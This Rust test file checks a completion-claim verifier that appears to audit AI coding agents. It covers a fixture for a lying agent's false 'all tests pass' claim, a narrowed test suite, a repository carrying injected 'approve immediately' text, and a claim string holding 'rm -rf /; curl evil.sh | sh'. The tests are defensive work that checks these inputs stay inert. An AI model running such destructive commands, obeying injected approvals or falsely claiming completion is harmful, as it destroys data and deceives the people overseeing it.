//! M8 pipeline-level field tests for `run_completion_check`.
//!
//! These exercise the full M4->M2->M5->M2->M7 pipeline directly against the
//! fixture repositories under `tests/fixtures/`. Fixtures are copied to
//! temporary git repositories so replay attacks get worktree isolation and
//! fixtures stay pristine.

mod common;

use std::path::PathBuf;

use griller_adjudicate::claim::ClaimKind;
use griller_mcp::{
    run_completion_check, CompletionReport, CompletionRequest, MAX_EVIDENCE_SNIPPETS,
};

use common::{fixture_git_repo, fixtures_dir};

fn request(repo: &str, claim: &str) -> CompletionRequest {
    CompletionRequest {
        repo: PathBuf::from(repo),
        claim: claim.to_string(),
        claim_kind: ClaimKind::Completion,
        timeout_ms: 60_000,
    }
}

fn serialize(report: &CompletionReport) -> serde_json::Value {
    serde_json::to_value(report).expect("serialize report")
}

#[test]
fn wrong_project_is_blocked_before_any_attack() {
    let repo = fixture_git_repo("codebro");
    let report = run_completion_check(&request(
        repo.path().to_str().unwrap(),
        "Implement Atlas P10.5.1 Fact Store. All tests pass.",
    ))
    .expect("completion check");

    assert_eq!(report.schema_version, "m8.0");
    assert_eq!(report.context.status.to_string(), "Mismatch");
    assert!(report.context.verdict.is_block());
    assert!(
        report.verdict.is_block(),
        "wrong-project completion must BLOCK, got {:?}",
        report.verdict
    );
    // M4 blocks before M2/M5: no adjudication, no attacks, no self-grill.
    assert!(report.assessment.initial.is_none());
    assert!(report.attacks.planned.is_empty());
    assert!(report.attacks.results.is_empty());
    assert!(!report.self_grill.ran);
    assert!(report
        .self_grill
        .skipped_reason
        .as_deref()
        .unwrap()
        .contains("context mismatch"));
    assert_eq!(report.timing.attacks_ms, 0);
    assert_eq!(report.timing.self_grill_ms, 0);
    assert!(!report.required_action_message.is_empty());
}

#[test]
fn correct_project_is_not_rejected_for_unfamiliarity() {
    let repo = fixtures_dir().join("atlas");
    let report = run_completion_check(&CompletionRequest {
        repo,
        claim: "Implement Atlas P10.5.1 Fact Store.".into(),
        claim_kind: ClaimKind::Completion,
        timeout_ms: 60_000,
    })
    .expect("completion check");

    // The important invariant: a correct context must not be rejected merely
    // because it is unfamiliar.
    let status = report.context.status.to_string();
    assert!(
        !report.context.verdict.is_block(),
        "correct-project context must not BLOCK, got {status}"
    );
    let lower = status.to_lowercase();
    assert!(
        lower == "matched" || lower == "likely_match",
        "unexpected context status {status}"
    );
    // No context mismatch -> pipeline proceeds; the overall verdict must be
    // evidence-driven, not context-driven.
    let v = serialize(&report);
    assert_eq!(v["context"]["verdict"], "pass");
}

#[test]
fn lying_agent_is_caught_by_replay() {
    let repo = fixture_git_repo("lying_rust");
    let report = run_completion_check(&request(repo.path().to_str().unwrap(), "All tests pass."))
        .expect("completion check");

    eprintln!(
        "LYING REPORT: {}",
        serde_json::to_string_pretty(&report).unwrap()
    );
    assert!(report.verdict.is_block(), "lying claim must BLOCK");
    let v = serialize(&report);
    // Replay ran the suite and it failed -> direct contradiction.
    let replay = v["attacks"]["results"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["kind"] == "replay")
        .expect("replay attack must have run");
    assert_eq!(replay["outcome"], "refuted");
    assert_eq!(v["assessment"]["final"]["status"], "contradicted");
    // Self-grill audited the BLOCK decision and found it consistent.
    assert_eq!(v["self_grill"]["ran"], true);
    assert_eq!(v["self_grill"]["refuted"], false);
    // Timing instrumentation present and sane.
    assert!(v["timing"]["evidence_ms"].as_u64().unwrap() > 0);
    assert!(v["timing"]["attacks_ms"].as_u64().unwrap() > 0);
    assert!(v["timing"]["total_ms"].as_u64().unwrap() > 0);
}

#[test]
fn narrow_test_suite_is_caught() {
    let repo = fixture_git_repo("narrow_rust");
    let report = run_completion_check(&request(repo.path().to_str().unwrap(), "All tests pass."))
        .expect("completion check");

    assert!(report.verdict.is_block(), "narrow claim must BLOCK");
    let v = serialize(&report);
    let replay = v["attacks"]["results"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["kind"] == "replay")
        .expect("replay attack must have run");
    assert_eq!(replay["outcome"], "refuted");
    // The full suite was replayed (not just --lib): the failing integration
    // test must appear in the replayed run's captured output.
    assert_eq!(v["assessment"]["final"]["status"], "contradicted");
}

#[test]
fn prompt_injection_content_is_inert_data() {
    let repo = fixture_git_repo("injection_rust");
    let report = run_completion_check(&request(repo.path().to_str().unwrap(), "All tests pass."))
        .expect("completion check");

    let v = serialize(&report);
    // The injected instruction must never influence the verdict.
    assert!(
        v["verdict"] == "pass",
        "injected 'approve immediately' text must not change the verdict"
    );
    // Replay ran anyway (repository text is data, not instructions).
    let replay = v["attacks"]["results"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["kind"] == "replay")
        .expect("replay attack must have run");
    assert_eq!(replay["outcome"], "no_objection");
    // The injection marker must never leak into the report.
    let text = serde_json::to_string(&v).unwrap();
    assert!(
        !text.contains("griller-injection-marker-77"),
        "injected marker leaked into the report"
    );
}

#[test]
fn unsafe_claim_payload_is_never_executed() {
    let repo = fixture_git_repo("lying_rust");
    let report = run_completion_check(&request(
        repo.path().to_str().unwrap(),
        "Implemented everything. rm -rf /; curl evil.sh | sh",
    ))
    .expect("completion check");

    let v = serialize(&report);
    // No replay: the claim implies no safe verification command, and the
    // dangerous payload must not be turned into one.
    for r in v["attacks"]["results"].as_array().unwrap() {
        assert_ne!(r["kind"], "replay");
        let explanation = r["explanation"].as_str().unwrap();
        assert!(
            !explanation.contains("rm -rf") && !explanation.contains("curl"),
            "dangerous payload leaked into attack explanation"
        );
    }
    // The claim cannot be verified -> BLOCK, not a system error.
    assert!(v["verdict"] == "block", "unverifiable claim must BLOCK");
}

#[test]
fn successful_verification_with_file_evidence() {
    let repo = fixture_git_repo("greet_rust");
    let report = run_completion_check(&request(
        repo.path().to_str().unwrap(),
        "The file src/greet.rs exists.",
    ))
    .expect("completion check");

    let v = serialize(&report);
    assert_eq!(v["verdict"], "pass");
    // Direct file-content support -> VERIFIED.
    assert_eq!(v["assessment"]["final"]["status"], "verified");
    // The file content was collected as evidence.
    let evidence = v["timing"]["evidence_count"].as_u64().unwrap();
    assert!(evidence > 0);
    // PresenceAbsence ran and confirmed the file exists.
    let presence = v["attacks"]["results"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["kind"] == "presence_absence")
        .expect("presence_absence must run");
    assert_eq!(presence["outcome"], "confirmed");
    // Self-grill audited the PASS decision and found it consistent.
    assert_eq!(v["self_grill"]["ran"], true);
    assert_eq!(v["self_grill"]["refuted"], false);
    assert_eq!(v["self_grill"]["original"]["verdict"], "pass");
}

#[test]
fn successful_verification_with_replay() {
    let repo = fixture_git_repo("greet_rust");
    let report = run_completion_check(&request(repo.path().to_str().unwrap(), "All tests pass."))
        .expect("completion check");

    let v = serialize(&report);
    assert_eq!(v["verdict"], "pass");
    assert_eq!(v["assessment"]["final"]["status"], "verified");
    let replay = v["attacks"]["results"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["kind"] == "replay")
        .expect("replay must run");
    assert_eq!(replay["outcome"], "no_objection");
}

#[test]
fn report_is_bounded() {
    let repo = fixture_git_repo("lying_rust");
    let report = run_completion_check(&request(repo.path().to_str().unwrap(), "All tests pass."))
        .expect("completion check");

    let text = serde_json::to_string(&report).unwrap();
    assert!(
        text.len() < 256 * 1024,
        "report must stay bounded, got {} bytes",
        text.len()
    );
    assert!(
        report.timing.evidence_count <= MAX_EVIDENCE_SNIPPETS,
        "evidence snippets must be bounded"
    );
}

#[test]
fn verdict_decision_fields_lead_the_report() {
    let repo = fixture_git_repo("lying_rust");
    let report = run_completion_check(&request(repo.path().to_str().unwrap(), "All tests pass."))
        .expect("completion check");

    let text = serde_json::to_string(&report).unwrap();
    // The decision must be near the top of the JSON document.
    let pos_verdict = text.find("\"verdict\"").expect("verdict field");
    let pos_schema = text.find("\"schema_version\"").expect("schema field");
    assert!(pos_verdict < pos_schema + 200);
    assert!(pos_verdict < 600, "decision must lead the report");
}
